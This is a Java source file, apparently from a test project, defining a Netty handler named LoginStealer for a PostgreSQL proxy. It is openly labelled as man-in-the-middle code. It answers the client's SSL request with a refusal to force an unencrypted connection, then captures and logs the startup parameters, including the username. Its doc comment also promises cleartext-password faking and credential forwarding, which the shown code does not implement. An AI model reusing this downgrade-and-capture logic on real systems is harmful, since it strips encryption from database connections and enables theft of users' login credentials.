package dev.bandarlog.test.netty.proxy.postgres.lean;

import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.ParameterStatus;
import dev.bandarlog.test.netty.proxy.postgres.lean.PostgresMessages.StartupMessage;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPromise;

/**
 * This class here implements the MITM logic:
 * <ul>
 * <li>Forces a ssl-less connection</li>
 * <li>Fakes a cleartext password connection</li>
 * <li>Forwards the stolen credentials to the server</li>
 * </ul>
 */
public class LoginStealer extends ChannelDuplexHandler {

	private static final ChannelFutureListener FIRE = ChannelFutureListener.FIRE_EXCEPTION_ON_FAILURE;
	
	private static final ByteBuf N = Unpooled.wrappedBuffer(new byte[] { 'N' });
	
	private final Map<String, String> parameters = new ConcurrentHashMap<>();
	
	@Override
	public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
		System.out.println("LoginStealer reading: " + msg);
		
		if (msg instanceof StartupMessage) {
			final StartupMessage startup = (StartupMessage) msg;
			
			if (startup.getProtocolVersion() == StartupMessage.SSL_NEGOCIATION_PROTOCOL_VERSION) {
				// hijack.
				startup.release();
				
				ByteBuf no = N;
				no.retain();
				ctx.writeAndFlush(no).addListener(FIRE);
				ctx.read();
				
				return;
			} else if (startup.getProtocolVersion() == StartupMessage.CANCEL_REQUEST_PROTOCOL_VERSION) {
				// Nothing to do.
			} else {
				// read the username
				final Map<String, String> payload = startup.getPayload();
				parameters.putAll(payload);
				
				System.out.println("Startup message: " + payload);
			}
		}
		
		super.channelRead(ctx, msg);
	}
	
	@Override
	public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {
		System.out.println("LoginStealer writing:" + msg);
		
		if (msg instanceof ParameterStatus) {
			final ParameterStatus parameterStatus = (ParameterStatus) msg;
			
			System.out.println("Parameter status: " + parameterStatus.getParameterName() + "=" + parameterStatus.getParameterValue());
		}
		
		super.write(ctx, msg, promise);
	}
}